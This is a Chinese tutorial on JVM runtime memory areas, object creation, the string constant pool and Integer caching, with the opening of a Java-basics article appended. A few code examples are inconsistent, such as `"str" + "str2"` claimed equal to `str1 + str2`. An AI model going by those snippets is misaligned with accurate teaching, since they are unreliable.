程序员把内存控制权利交给 Java 虚拟机，一旦出现内存泄漏和溢出方面的问题，如果不了解虚拟机是怎样使用内存的，那么排查错误将会是一个非常艰巨的任务。\n二 运行时数据区域    Java 虚拟机在执行 Java 程序的过程中会把它管理的内存划分成若干个不同的数据区域。JDK 1.8 和之前的版本略有不同，下面会介绍到。\nJDK 1.8 之前：\nJDK 1.8 ：\n线程私有的：\n 程序计数器 虚拟机栈 本地方法栈  线程共享的：\n 堆 方法区 直接内存 (非运行时数据区的一部分)  2.1 程序计数器    程序计数器是一块较小的内存空间，可以看作是当前线程所执行的字节码的行号指示器。字节码解释器工作时通过改变这个计数器的值来选取下一条需要执行的字节码指令，分支、循环、跳转、异常处理、线程恢复等功能都需要依赖这个计数器来完成。\n另外，为了线程切换后能恢复到正确的执行位置，每条线程都需要有一个独立的程序计数器，各线程之间计数器互不影响，独立存储，我们称这类内存区域为“线程私有”的内存。\n从上面的介绍中我们知道程序计数器主要有两个作用：\n 字节码解释器通过改变程序计数器来依次读取指令，从而实现代码的流程控制，如：顺序执行、选择、循环、异常处理。 在多线程的情况下，程序计数器用于记录当前线程执行的位置，从而当线程被切换回来的时候能够知道该线程上次运行到哪儿了。  注意：程序计数器是唯一一个不会出现 OutOfMemoryError 的内存区域，它的生命周期随着线程的创建而创建，随着线程的结束而死亡。\n2.2 Java 虚拟机栈    与程序计数器一样，Java 虚拟机栈也是线程私有的，它的生命周期和线程相同，描述的是 Java 方法执行的内存模型，每次方法调用的数据都是通过栈传递的。\nJava 内存可以粗糙的区分为堆内存（Heap）和栈内存 (Stack)，其中栈就是现在说的虚拟机栈，或者说是虚拟机栈中局部变量表部分。 （实际上，Java 虚拟机栈是由一个个栈帧组成，而每个栈帧中都拥有：局部变量表、操作数栈、动态链接、方法出口信息。）\n局部变量表主要存放了编译期可知的各种数据类型（boolean、byte、char、short、int、float、long、double）、对象引用（reference 类型，它不同于对象本身，可能是一个指向对象起始地址的引用指针，也可能是指向一个代表对象的句柄或其他与此对象相关的位置）。\nJava 虚拟机栈会出现两种错误：StackOverFlowError 和 OutOfMemoryError。\n StackOverFlowError： 若 Java 虚拟机栈的内存大小不允许动态扩展，那么当线程请求栈的深度超过当前 Java 虚拟机栈的最大深度的时候，就抛出 StackOverFlowError 错误。 OutOfMemoryError： Java 虚拟机栈的内存大小可以动态扩展， 如果虚拟机在动态扩展栈时无法申请到足够的内存空间，则抛出OutOfMemoryError异常。  Java 虚拟机栈也是线程私有的，每个线程都有各自的 Java 虚拟机栈，而且随着线程的创建而创建，随着线程的死亡而死亡。\n扩展：那么方法/函数如何调用？\nJava 栈可以类比数据结构中栈，Java 栈中保存的主要内容是栈帧，每一次函数调用都会有一个对应的栈帧被压入 Java 栈，每一个函数调用结束后，都会有一个栈帧被弹出。\nJava 方法有两种返回方式：\n return 语句。 抛出异常。  不管哪种返回方式都会导致栈帧被弹出。\n2.3 本地方法栈    和虚拟机栈所发挥的作用非常相似，区别是： 虚拟机栈为虚拟机执行 Java 方法 （也就是字节码）服务，而本地方法栈则为虚拟机使用到的 Native 方法服务。 在 HotSpot 虚拟机中和 Java 虚拟机栈合二为一。\n本地方法被执行的时候，在本地方法栈也会创建一个栈帧，用于存放该本地方法的局部变量表、操作数栈、动态链接、出口信息。\n方法执行完毕后相应的栈帧也会出栈并释放内存空间，也会出现 StackOverFlowError 和 OutOfMemoryError 两种错误。\n2.4 堆    Java 虚拟机所管理的内存中最大的一块，Java 堆是所有线程共享的一块内存区域，在虚拟机启动时创建。此内存区域的唯一目的就是存放对象实例，几乎所有的对象实例以及数组都在这里分配内存。\nJava 世界中“几乎”所有的对象都在堆中分配，但是，随着 JIT 编译器的发展与逃逸分析技术逐渐成熟，栈上分配、标量替换优化技术将会导致一些微妙的变化，所有的对象都分配到堆上也渐渐变得不那么“绝对”了。从 JDK 1.7 开始已经默认开启逃逸分析，如果某些方法中的对象引用没有被返回或者未被外面使用（也就是未逃逸出去），那么对象可以直接在栈上分配内存。\nJava 堆是垃圾收集器管理的主要区域，因此也被称作GC 堆（Garbage Collected Heap）。从垃圾回收的角度，由于现在收集器基本都采用分代垃圾收集算法，所以 Java 堆还可以细分为：新生代和老年代；再细致一点有：Eden 空间、From Survivor、To Survivor 空间等。进一步划分的目的是更好地回收内存，或者更快地分配内存。\n在 JDK 7 版本及 JDK 7 版本之前，堆内存被通常分为下面三部分：\n 新生代内存(Young Generation) 老生代(Old Generation) 永生代(Permanent Generation)  JDK 8 版本之后方法区（HotSpot 的永久代）被彻底移除了（JDK1.7 就已经开始了），取而代之是元空间，元空间使用的是直接内存。\n上图所示的 Eden 区、两个 Survivor 区都属于新生代（为了区分，这两个 Survivor 区域按照顺序被命名为 from 和 to），中间一层属于老年代。\n大部分情况，对象都会首先在 Eden 区域分配，在一次新生代垃圾回收后，如果对象还存活，则会进入 s0 或者 s1，并且对象的年龄还会加 1(Eden 区-\u0026gt;Survivor 区后对象的初始年龄变为 1)，当它的年龄增加到一定程度（默认为 15 岁），就会被晋升到老年代中。对象晋升到老年代的年龄阈值，可以通过参数 -XX:MaxTenuringThreshold 来设置。\n 🐛 修正（参见：issue552） ：“Hotspot 遍历所有对象时，按照年龄从小到大对其所占用的大小进行累积，当累积的某个年龄大小超过了 survivor 区的一半时，取这个年龄和 MaxTenuringThreshold 中更小的一个值，作为新的晋升年龄阈值”。\n动态年龄计算的代码如下\nuint ageTable::compute_tenuring_threshold(size_t survivor_capacity) { //survivor_capacity是survivor空间的大小 size_t desired_survivor_size = (size_t)((((double) survivor_capacity)*TargetSurvivorRatio)/100); size_t total = 0; uint age = 1; while (age \u0026lt; table_size) { total += sizes[age];//sizes数组是每个年龄段对象大小 if (total \u0026gt; desired_survivor_size) break; age++; } uint result = age \u0026lt; MaxTenuringThreshold ? age : MaxTenuringThreshold; ... }  堆这里最容易出现的就是 OutOfMemoryError 错误，并且出现这种错误之后的表现形式还会有几种，比如：\n java.lang.OutOfMemoryError: GC Overhead Limit Exceeded ： 当 JVM 花太多时间执行垃圾回收并且只能回收很少的堆空间时，就会发生此错误。 java.lang.OutOfMemoryError: Java heap space :假如在创建新的对象时, 堆内存中的空间不足以存放新创建的对象, 就会引发此错误。(和配置的最大堆内存有关，且受制于物理内存大小。最大堆内存可通过-Xmx参数配置，若没有特别配置，将会使用默认值，详见：Default Java 8 max heap size) \u0026hellip;\u0026hellip;  2.5 方法区    方法区与 Java 堆一样，是各个线程共享的内存区域，它用于存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码等数据。虽然 Java 虚拟机规范把方法区描述为堆的一个逻辑部分，但是它却有一个别名叫做 Non-Heap（非堆），目的应该是与 Java 堆区分开来。\n方法区也被称为永久代。很多人都会分不清方法区和永久代的关系，为此我也查阅了文献。\n2.5.1 方法区和永久代的关系     《Java 虚拟机规范》只是规定了有方法区这么个概念和它的作用，并没有规定如何去实现它。那么，在不同的 JVM 上方法区的实现肯定是不同的了。 方法区和永久代的关系很像 Java 中接口和类的关系，类实现了接口，而永久代就是 HotSpot 虚拟机对虚拟机规范中方法区的一种实现方式。 也就是说，永久代是 HotSpot 的概念，方法区是 Java 虚拟机规范中的定义，是一种规范，而永久代是一种实现，一个是标准一个是实现，其他的虚拟机实现并没有永久代这一说法。\n 2.5.2 常用参数    JDK 1.8 之前永久代还没被彻底移除的时候通常通过下面这些参数来调节方法区大小\n-XX:PermSize=N //方法区 (永久代) 初始大小 -XX:MaxPermSize=N //方法区 (永久代) 最大大小,超过这个值将会抛出 OutOfMemoryError 异常:java.lang.OutOfMemoryError: PermGen 相对而言，垃圾收集行为在这个区域是比较少出现的，但并非数据进入方法区后就“永久存在”了。\nJDK 1.8 的时候，方法区（HotSpot 的永久代）被彻底移除了（JDK1.7 就已经开始了），取而代之是元空间，元空间使用的是直接内存。\n下面是一些常用参数：\n-XX:MetaspaceSize=N //设置 Metaspace 的初始（和最小大小） -XX:MaxMetaspaceSize=N //设置 Metaspace 的最大大小 与永久代很大的不同就是，如果不指定大小的话，随着更多类的创建，虚拟机会耗尽所有可用的系统内存。\n2.5.3 为什么要将永久代 (PermGen) 替换为元空间 (MetaSpace) 呢?    下图来自《深入理解 Java 虚拟机》第 3 版 2.2.5\n  整个永久代有一个 JVM 本身设置的固定大小上限，无法进行调整，而元空间使用的是直接内存，受本机可用内存的限制，虽然元空间仍旧可能溢出，但是比原来出现的几率会更小。\n 当元空间溢出时会得到如下错误： java.lang.OutOfMemoryError: MetaSpace\n   你可以使用 -XX：MaxMetaspaceSize 标志设置最大元空间大小，默认值为 unlimited，这意味着它只受系统内存的限制。-XX：MetaspaceSize 调整标志定义元空间的初始大小如果未指定此标志，则 Metaspace 将根据运行时的应用程序需求动态地重新调整大小。\n 元空间里面存放的是类的元数据，这样加载多少类的元数据就不由 MaxPermSize 控制了, 而由系统的实际可用空间来控制，这样能加载的类就更多了。\n  在 JDK8，合并 HotSpot 和 JRockit 的代码时, JRockit 从来没有一个叫永久代的东西, 合并之后就没有必要额外的设置这么一个永久代的地方了。\n  2.6 运行时常量池    运行时常量池是方法区的一部分。Class 文件中除了有类的版本、字段、方法、接口等描述信息外，还有常量池表（用于存放编译期生成的各种字面量和符号引用）\n既然运行时常量池是方法区的一部分，自然受到方法区内存的限制，当常量池无法再申请到内存时会抛出 OutOfMemoryError 错误。\nJDK1.7 及之后版本的 JVM 已经将运行时常量池从方法区中移了出来，在 Java 堆（Heap）中开辟了一块区域存放运行时常量池。\n 🐛 修正（参见：issue747，reference） ：\n JDK1.7 之前运行时常量池逻辑包含字符串常量池存放在方法区, 此时 hotspot 虚拟机对方法区的实现为永久代 JDK1.7 字符串常量池被从方法区拿到了堆中, 这里没有提到运行时常量池,也就是说字符串常量池被单独拿到堆,运行时常量池剩下的东西还在方法区, 也就是 hotspot 中的永久代 。 JDK1.8 hotspot 移除了永久代用元空间(Metaspace)取而代之, 这时候字符串常量池还在堆, 运行时常量池还在方法区, 只不过方法区的实现从永久代变成了元空间(Metaspace)   相关问题：JVM 常量池中存储的是对象还是引用呢？： https://www.zhihu.com/question/57109429/answer/151717241 by RednaxelaFX\n2.7 直接内存    直接内存并不是虚拟机运行时数据区的一部分，也不是虚拟机规范中定义的内存区域，但是这部分内存也被频繁地使用。而且也可能导致 OutOfMemoryError 错误出现。\nJDK1.4 中新加入的 NIO(New Input/Output) 类，引入了一种基于通道（Channel）与缓存区（Buffer）的 I/O 方式，它可以直接使用 Native 函数库直接分配堆外内存，然后通过一个存储在 Java 堆中的 DirectByteBuffer 对象作为这块内存的引用进行操作。这样就能在一些场景中显著提高性能，因为避免了在 Java 堆和 Native 堆之间来回复制数据。\n本机直接内存的分配不会受到 Java 堆的限制，但是，既然是内存就会受到本机总内存大小以及处理器寻址空间的限制。\n三 HotSpot 虚拟机对象探秘    通过上面的介绍我们大概知道了虚拟机的内存情况，下面我们来详细的了解一下 HotSpot 虚拟机在 Java 堆中对象分配、布局和访问的全过程。\n3.1 对象的创建    下图便是 Java 对象的创建过程，我建议最好是能默写出来，并且要掌握每一步在做什么。 Step1:类加载检查    虚拟机遇到一条 new 指令时，首先将去检查这个指令的参数是否能在常量池中定位到这个类的符号引用，并且检查这个符号引用代表的类是否已被加载过、解析和初始化过。如果没有，那必须先执行相应的类加载过程。\nStep2:分配内存    在类加载检查通过后，接下来虚拟机将为新生对象分配内存。对象所需的内存大小在类加载完成后便可确定，为对象分配空间的任务等同于把一块确定大小的内存从 Java 堆中划分出来。分配方式有 “指针碰撞” 和 “空闲列表” 两种，选择哪种分配方式由 Java 堆是否规整决定，而 Java 堆是否规整又由所采用的垃圾收集器是否带有压缩整理功能决定。\n内存分配的两种方式：（补充内容，需要掌握）\n选择以上两种方式中的哪一种，取决于 Java 堆内存是否规整。而 Java 堆内存是否规整，取决于 GC 收集器的算法是\u0026quot;标记-清除\u0026quot;，还是\u0026quot;标记-整理\u0026quot;（也称作\u0026quot;标记-压缩\u0026quot;），值得注意的是，复制算法内存也是规整的\n内存分配并发问题（补充内容，需要掌握）\n在创建对象的时候有一个很重要的问题，就是线程安全，因为在实际开发过程中，创建对象是很频繁的事情，作为虚拟机来说，必须要保证线程是安全的，通常来讲，虚拟机采用两种方式来保证线程安全：\n CAS+失败重试： CAS 是乐观锁的一种实现方式。所谓乐观锁就是，每次不加锁而是假设没有冲突而去完成某项操作，如果因为冲突失败就重试，直到成功为止。虚拟机采用 CAS 配上失败重试的方式保证更新操作的原子性。 TLAB： 为每一个线程预先在 Eden 区分配一块儿内存，JVM 在给线程中的对象分配内存时，首先在 TLAB 分配，当对象大于 TLAB 中的剩余内存或 TLAB 的内存已用尽时，再采用上述的 CAS 进行内存分配  Step3:初始化零值    内存分配完成后，虚拟机需要将分配到的内存空间都初始化为零值（不包括对象头），这一步操作保证了对象的实例字段在 Java 代码中可以不赋初始值就直接使用，程序能访问到这些字段的数据类型所对应的零值。\nStep4:设置对象头    初始化零值完成之后，虚拟机要对对象进行必要的设置，例如这个对象是哪个类的实例、如何才能找到类的元数据信息、对象的哈希码、对象的 GC 分代年龄等信息。 这些信息存放在对象头中。 另外，根据虚拟机当前运行状态的不同，如是否启用偏向锁等，对象头会有不同的设置方式。\nStep5:执行 init 方法    在上面工作都完成之后，从虚拟机的视角来看，一个新的对象已经产生了，但从 Java 程序的视角来看，对象创建才刚开始，\u0026lt;init\u0026gt; 方法还没有执行，所有的字段都还为零。所以一般来说，执行 new 指令之后会接着执行 \u0026lt;init\u0026gt; 方法，把对象按照程序员的意愿进行初始化，这样一个真正可用的对象才算完全产生出来。\n3.2 对象的内存布局    在 Hotspot 虚拟机中，对象在内存中的布局可以分为 3 块区域：对象头、实例数据和对齐填充。\nHotspot 虚拟机的对象头包括两部分信息，第一部分用于存储对象自身的运行时数据（哈希码、GC 分代年龄、锁状态标志等等），另一部分是类型指针，即对象指向它的类元数据的指针，虚拟机通过这个指针来确定这个对象是那个类的实例。\n实例数据部分是对象真正存储的有效信息，也是在程序中所定义的各种类型的字段内容。\n对齐填充部分不是必然存在的，也没有什么特别的含义，仅仅起占位作用。 因为 Hotspot 虚拟机的自动内存管理系统要求对象起始地址必须是 8 字节的整数倍，换句话说就是对象的大小必须是 8 字节的整数倍。而对象头部分正好是 8 字节的倍数（1 倍或 2 倍），因此，当对象实例数据部分没有对齐时，就需要通过对齐填充来补全。\n3.3 对象的访问定位    建立对象就是为了使用对象，我们的 Java 程序通过栈上的 reference 数据来操作堆上的具体对象。对象的访问方式由虚拟机实现而定，目前主流的访问方式有① 使用句柄和② 直接指针两种：\n  句柄： 如果使用句柄的话，那么 Java 堆中将会划分出一块内存来作为句柄池，reference 中存储的就是对象的句柄地址，而句柄中包含了对象实例数据与类型数据各自的具体地址信息；\n  直接指针： 如果使用直接指针访问，那么 Java 堆对象的布局中就必须考虑如何放置访问类型数据的相关信息，而 reference 中存储的直接就是对象的地址。\n  这两种对象访问方式各有优势。使用句柄来访问的最大好处是 reference 中存储的是稳定的句柄地址，在对象被移动时只会改变句柄中的实例数据指针，而 reference 本身不需要修改。使用直接指针访问方式最大的好处就是速度快，它节省了一次指针定位的时间开销。\n四 重点补充内容    4.1 字符串常量池常见问题    我们先来看一个非常常见的面试题：String 类型的变量和常量做“+”运算时发生了什么？ 。\n先来看字符串不加 final 关键字拼接的情况（JDK1.8）：\nString str1 = \u0026#34;str\u0026#34;; String str2 = \u0026#34;ing\u0026#34;; String str3 = \u0026#34;str\u0026#34; + \u0026#34;ing\u0026#34;;//常量池中的对象 String str4 = str1 + str2; //在堆上创建的新的对象 String str5 = \u0026#34;string\u0026#34;;//常量池中的对象 System.out.println(str3 == str4);//false System.out.println(str3 == str5);//true System.out.println(str4 == str5);//false  注意 ：比较 String 字符串的值是否相等，可以使用 equals() 方法。 String 中的 equals 方法是被重写过的。 Object 的 equals 方法是比较的对象的内存地址，而 String 的 equals 方法比较的是字符串的值是否相等。如果你使用 == 比较两个字符串是否相等的话，IDEA 还是提示你使用 equals() 方法替换。\n  对于基本数据类型来说，== 比较的是值。对于引用数据类型来说，==比较的是对象的内存地址。\n 对于编译期可以确定值的字符串，也就是常量字符串 ，jvm 会将其存入字符串常量池。\n 字符串常量池 是 JVM 为了提升性能和减少内存消耗针为字符串（String 类）专门开辟的一块区域，主要目的是为了避免字符串的重复创建。\nString aa = \u0026#34;ab\u0026#34;; // 放在常量池中 String bb = \u0026#34;ab\u0026#34;; // 从常量池中查找 System.out.println(\u0026#34;aa==bb\u0026#34;);// true JDK1.7 之前运行时常量池逻辑包含字符串常量池存放在方法区。JDK1.7 的时候，字符串常量池被从方法区拿到了堆中。\n 并且，字符串常量拼接得到的字符串常量在编译阶段就已经被存放字符串常量池，这个得益于编译器的优化。\n 在编译过程中，Javac 编译器（下文中统称为编译器）会进行一个叫做 常量折叠(Constant Folding) 的代码优化。《深入理解 Java 虚拟机》中是也有介绍到：\n常量折叠会把常量表达式的值求出来作为常量嵌在最终生成的代码中，这是 Javac 编译器会对源代码做的极少量优化措施之一(代码优化几乎都在即时编译器中进行)。\n对于 String str3 = \u0026quot;str\u0026quot; + \u0026quot;ing\u0026quot;; 编译器会给你优化成 String str3 = \u0026quot;string\u0026quot;; 。\n并不是所有的常量都会进行折叠，只有编译器在程序编译期就可以确定值的常量才可以：\n 基本数据类型(byte、boolean、short、char、int、float、long、double)以及字符串常量 final 修饰的基本数据类型和字符串变量 字符串通过 “+”拼接得到的字符串、基本数据类型之间算数运算（加减乘除）、基本数据类型的位运算（\u0026laquo;、\u0026gt;\u0026gt;、\u0026gt;\u0026raquo; ）   因此，str1 、 str2 、 str3 都属于字符串常量池中的对象。\n引用的值在程序编译期是无法确定的，编译器无法对其进行优化。\n对象引用和“+”的字符串拼接方式，实际上是通过 StringBuilder 调用 append() 方法实现的，拼接完成之后调用 toString() 得到一个 String 对象 。\nString str4 = new StringBuilder().append(str1).append(str2).toString(); 因此，str4 并不是字符串常量池中存在的对象，属于堆上的新对象。\n我画了一个图帮助理解：\n我们在平时写代码的时候，尽量避免多个字符串对象拼接，因为这样会重新创建对象。如果需要改变字符串的话，可以使用 StringBuilder 或者 StringBuffer。\n不过，字符串使用 final 关键字声明之后，可以让编译器当做常量来处理。\nfinal String str1 = \u0026#34;str\u0026#34;; final String str2 = \u0026#34;ing\u0026#34;; // 下面两个表达式其实是等价的 String c = \u0026#34;str\u0026#34; + \u0026#34;str2\u0026#34;;// 常量池中的对象 String d = str1 + str2; // 常量池中的对象 System.out.println(c == d);// true 被 final 关键字修改之后的 String 会被编译器当做常量来处理，编译器在程序编译期就可以确定它的值，其效果就想到于访问常量。\n如果 ，编译器在运行时才能知道其确切值的话，就无法对其优化。\n示例代码如下（str2 在运行时才能确定其值）：\nfinal String str1 = \u0026#34;str\u0026#34;; final String str2 = getStr(); String c = \u0026#34;str\u0026#34; + \u0026#34;str2\u0026#34;;// 常量池中的对象 String d = str1 + str2; // 常量池中的对象 System.out.println(c == d);// false public static String getStr() { return \u0026#34;ing\u0026#34;; } 我们再来看一个类似的问题！\nString str1 = \u0026#34;abcd\u0026#34;; String str2 = new String(\u0026#34;abcd\u0026#34;); String str3 = new String(\u0026#34;abcd\u0026#34;); System.out.println(str1==str2); System.out.println(str2==str3); 上面的代码运行之后会输出什么呢？\n答案是：\nfalse false 这是为什么呢？\n我们先来看下面这种创建字符串对象的方式：\n// 从字符串常量池中拿对象 String str1 = \u0026#34;abcd\u0026#34;; 这种情况下，jvm 会先检查字符串常量池中有没有\u0026quot;abcd\u0026quot;，如果字符串常量池中没有，则创建一个，然后 str1 指向字符串常量池中的对象，如果有，则直接将 str1 指向\u0026quot;abcd\u0026quot;\u0026quot;；\n因此，str1 指向的是字符串常量池的对象。\n我们再来看下面这种创建字符串对象的方式：\n// 直接在堆内存空间创建一个新的对象。 String str2 = new String(\u0026#34;abcd\u0026#34;); String str3 = new String(\u0026#34;abcd\u0026#34;); 只要使用 new 的方式创建对象，便需要创建新的对象 。\n使用 new 的方式创建对象的方式如下，可以简单概括为 3 步：\n 在堆中创建一个字符串对象 检查字符串常量池中是否有和 new 的字符串值相等的字符串常量 如果没有的话需要在字符串常量池中也创建一个值相等的字符串常量，如果有的话，就直接返回堆中的字符串实例对象地址。  因此，str2 和 str3 都是在堆中新创建的对象。\n字符串常量池比较特殊，它的主要使用方法有两种：\n 直接使用双引号声明出来的 String 对象会直接存储在常量池中。 如果不是用双引号声明的 String 对象，使用 String 提供的 intern() 方法也有同样的效果。String.intern() 是一个 Native 方法，它的作用是：如果运行时常量池中已经包含一个等于此 String 对象内容的字符串，则返回常量池中该字符串的引用；如果没有，JDK1.7 之前（不包含 1.7）的处理方式是在常量池中创建与此 String 内容相同的字符串，并返回常量池中创建的字符串的引用，JDK1.7 以及之后，字符串常量池被从方法区拿到了堆中，jvm 不会在常量池中创建该对象，而是将堆中这个对象的引用直接放到常量池中，减少不必要的内存开销。  示例代码如下（JDK 1.8） :\nString s1 = \u0026#34;Javatpoint\u0026#34;; String s2 = s1.intern(); String s3 = new String(\u0026#34;Javatpoint\u0026#34;); String s4 = s3.intern(); System.out.println(s1==s2); // True System.out.println(s1==s3); // False System.out.println(s1==s4); // True System.out.println(s2==s3); // False System.out.println(s2==s4); // True System.out.println(s3==s4); // False 总结 ：\n 对于基本数据类型来说，==比较的是值。对于引用数据类型来说，==比较的是对象的内存地址。 在编译过程中，Javac 编译器（下文中统称为编译器）会进行一个叫做 常量折叠(Constant Folding) 的代码优化。常量折叠会把常量表达式的值求出来作为常量嵌在最终生成的代码中，这是 Javac 编译器会对源代码做的极少量优化措施之一(代码优化几乎都在即时编译器中进行)。 一般来说，我们要尽量避免通过 new 的方式创建字符串。使用双引号声明的 String 对象（ String s1 = \u0026quot;java\u0026quot; ）更利于让编译器有机会优化我们的代码，同时也更易于阅读。 被 final 关键字修改之后的 String 会被编译器当做常量来处理，编译器程序编译期就可以确定它的值，其效果就想到于访问常量。  4.2 String s1 = new String(\u0026ldquo;abc\u0026rdquo;);这句话创建了几个字符串对象？    会创建 1 或 2 个字符串：\n 如果字符串常量池中已存在字符串常量“abc”，则只会在堆空间创建一个字符串常量“abc”。 如果字符串常量池中没有字符串常量“abc”，那么它将首先在字符串常量池中创建，然后在堆空间中创建，因此将创建总共 2 个字符串对象。  验证：\nString s1 = new String(\u0026#34;abc\u0026#34;);// 堆内存的地址值 String s2 = \u0026#34;abc\u0026#34;; System.out.println(s1 == s2);// 输出 false,因为一个是堆内存，一个是常量池的内存，故两者是不同的。 System.out.println(s1.equals(s2));// 输出 true 结果：\nfalse true 4.3 8 种基本类型的包装类和常量池    Java 基本类型的包装类的大部分都实现了常量池技术。\nByte,Short,Integer,Long 这 4 种包装类默认创建了数值 [-128，127] 的相应类型的缓存数据，Character 创建了数值在 [0,127] 范围的缓存数据，Boolean 直接返回 True Or False。\n两种浮点数类型的包装类 Float,Double 并没有实现常量池技术。\nInteger i1 = 33; Integer i2 = 33; System.out.println(i1 == i2);// 输出 true Integer i11 = 333; Integer i22 = 333; System.out.println(i11 == i22);// 输出 false Double i3 = 1.2; Double i4 = 1.2; System.out.println(i3 == i4);// 输出 false Integer 缓存源代码：\n/** *此方法将始终缓存-128 到 127（包括端点）范围内的值，并可以缓存此范围之外的其他值。 */ public static Integer valueOf(int i) { if (i \u0026gt;= IntegerCache.low \u0026amp;\u0026amp; i \u0026lt;= IntegerCache.high) return IntegerCache.cache[i + (-IntegerCache.low)]; return new Integer(i); } private static class IntegerCache { static final int low = -128; static final int high; static final Integer cache[]; } Character 缓存源码:\npublic static Character valueOf(char c) { if (c \u0026lt;= 127) { // must cache  return CharacterCache.cache[(int)c]; } return new Character(c); } private static class CharacterCache { private CharacterCache(){} static final Character cache[] = new Character[127 + 1]; static { for (int i = 0; i \u0026lt; cache.length; i++) cache[i] = new Character((char)i); } } Boolean 缓存源码：\npublic static Boolean valueOf(boolean b) { return (b ? TRUE : FALSE); } 如果超出对应范围仍然会去创建新的对象，缓存的范围区间的大小只是在性能和资源之间的权衡。\n下面我们来看一下问题。下面的代码的输出结果是 true 还是 flase 呢？\nInteger i1 = 40; Integer i2 = new Integer(40); System.out.println(i1==i2); Integer i1=40 这一行代码会发生拆箱，也就是说这行代码等价于 Integer i1=Integer.valueOf(40) 。因此，i1 直接使用的是常量池中的对象。而Integer i1 = new Integer(40) 会直接创建新的对象。\n因此，答案是 false 。你答对了吗？\n记住：所有整型包装类对象之间值的比较，全部使用 equals 方法比较。\nInteger 比较更丰富的一个例子:\nInteger i1 = 40; Integer i2 = 40; Integer i3 = 0; Integer i4 = new Integer(40); Integer i5 = new Integer(40); Integer i6 = new Integer(0); System.out.println(i1 == i2);// true System.out.println(i1 == i2 + i3);//true System.out.println(i1 == i4);// false System.out.println(i4 == i5);// false System.out.println(i4 == i5 + i6);// true System.out.println(40 == i5 + i6);// true i1 , i2  , i3 都是常量池中的对象，i4 , i5 , i6 是堆中的对象。\ni4 == i5 + i6 为什么是 true 呢？因为， i5 和 i6 会进行自动拆箱操作，进行数值相加，即 i4 == 40 。 Integer 对象无法与数值进行直接比较，所以 i4 自动拆箱转为 int 值 40，最终这条语句转为 40 == 40 进行数值比较。\n参考     《深入理解 Java 虚拟机：JVM 高级特性与最佳实践（第二版》 《实战 java 虚拟机》 https://docs.oracle.com/javase/specs/index.html http://www.pointsoftware.ch/en/under-the-hood-runtime-data-areas-javas-memory-model/ https://dzone.com/articles/jvm-permgen-%E2%80%93-where-art-thou https://stackoverflow.com/questions/9095748/method-area-and-permgen 深入解析 String#internhttps://tech.meituan.com/2014/03/06/in-depth-understanding-string-intern.html R 大（RednaxelaFX）关于常量折叠的回答：https://www.zhihu.com/question/55976094/answer/147302764  "},{"id":224,"href":"/java/basis/Java%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","title":"Java基础知识","parent":"basis","content":" 基础概念与常识  Java 语言有哪些特点? JVM vs JDK vs JRE  JVM JDK 和 JRE   为什么说 Java 语言“编译与解释并存”？ Oracle JDK 和 OpenJDK 的对比 Java 和 C++的区别? import java 和 javax 有什么区别？   基本语法  字符型常量和字符串常量的区别? 注释 标识符和关键字的区别是什么？ Java 中有哪些常见的关键字？ 自增自减运算符 continue、break、和 return 的区别是什么？ Java 泛型了解么？什么是类型擦除？介绍一下常用的通配符？ ==和 equals 的区别 hashCode()与 equals()   基本数据类型  Java 中的几种基本数据类型是什么？对应的包装类型是什么？各自占用多少字节呢？ 自动装箱与拆箱 8 种基本类型的包装类和常量池   方法（函数）  什么是方法的返回值? 方法有哪几种类型？ 在一个静态方法内调用一个非静态成员为什么是非法的? 静态方法和实例方法有何不同？ 为什么 Java 中只有值传递？ 重载和重写的区别  重载 重写   深拷贝 vs 浅拷贝   Java 面向对象  面向对象和面向过程的区别 成员变量与局部变量的区别有哪些？ 创建一个对象用什么运算符?对象实体与对象引用有何不同? 对象的相等与指向他们的引用相等,两者有什么不同? 一个类的构造方法的作用是什么? 若一个类没有声明构造方法，该程序能正确执行吗? 为什么? 构造方法有哪些特点？是否可被 override? 面向对象三大特征  封装 继承 多态   String StringBuffer 和 StringBuilder 的区别是什么? String 为什么是不可变的? Object 类的常见方法总结   反射  何为反射？ 反射机制优缺点 反射的应用场景   异常  Java 异常类层次结构图 Throwable 类常用方法 try-catch-finally 使用 try-with-resources 来代替try-catch-finally   I\\O 流  什么是序列化?什么是反序列化? Java 序列化中如果有些字段不想进行序列化，怎么办？ 获取用键盘输入常用的两种方法 Java 中 IO 流分为几种? 既然有了字节流,为什么还要有字符流?   4. 参考  基础概念与常识    Java 语言有哪些特点?     简单易学； 面向对象（封装，继承，多态）； 平台无关性（ Java 虚拟机实现平台无关性）； 支持多线程（ C++ 语言没有内置的多线程机制，因此必须调用操作系统的多线程功能来进行多线程程序设计，而 Java 语言却提供了多线程支持）； 可靠性； 安全性； 支持网络编程并且很方便（ Java 语言诞生本身就是为简化网络编程设计的，因此 Java 语言不仅支持网络编程而且很方便）； 编译与解释并存；   🐛 修正（参见： issue#544） ：C++11 开始（2011 年的时候）,C++就引入了多线程库，在 windows、linux、macos 都可以使用std::thread和std::async来创建线程。参考链接：http://www.cplusplus.com/reference/thread/thread/?kw=thread\n JVM vs JDK vs JRE    JVM    Java 虚拟机（JVM）是运行 Java 字节码的虚拟机。JVM 有针对不同系统的特定实现（Windows，Linux，macOS），目的是使用相同的字节码，它们都会给出相同的结果。\n什么是字节码?采用字节码的好处是什么?\n 在 Java 中，JVM 可以理解的代码就叫做字节码（即扩展名为 .class 的文件），它不面向任何特定的处理器，只面向虚拟机。Java 语言通过字节码的方式，在一定程度上解决了传统解释型语言执行效率低的问题，同时又保留了解释型语言可移植的特点。所以 Java 程序运行时比较高效，而且，由于字节码并不针对一种特定的机器，因此，Java 程序无须重新编译便可在多种不同操作系统的计算机上运行。\n Java 程序从源代码到运行一般有下面 3 步：\n我们需要格外注意的是 .class-\u0026gt;机器码 这一步。在这一步 JVM 类加载器首先加载字节码文件，然后通过解释器逐行解释执行，这种方式的执行速度会相对比较慢。而且，有些方法和代码块是经常需要被调用的(也就是所谓的热点代码)，所以后面引进了 JIT 编译器，而 JIT 属于运行时编译。当 JIT 编译器完成第一次编译后，其会将字节码对应的机器码保存下来，下次可以直接使用。而我们知道，机器码的运行效率肯定是高于 Java 解释器的。这也解释了我们为什么经常会说 Java 是编译与解释共存的语言。\n HotSpot 采用了惰性评估(Lazy Evaluation)的做法，根据二八定律，消耗大部分系统资源的只有那一小部分的代码（热点代码），而这也就是 JIT 所需要编译的部分。JVM 会根据代码每次被执行的情况收集信息并相应地做出一些优化，因此执行的次数越多，它的速度就越快。JDK 9 引入了一种新的编译模式 AOT(Ahead of Time Compilation)，它是直接将字节码编译成机器码，这样就避免了 JIT 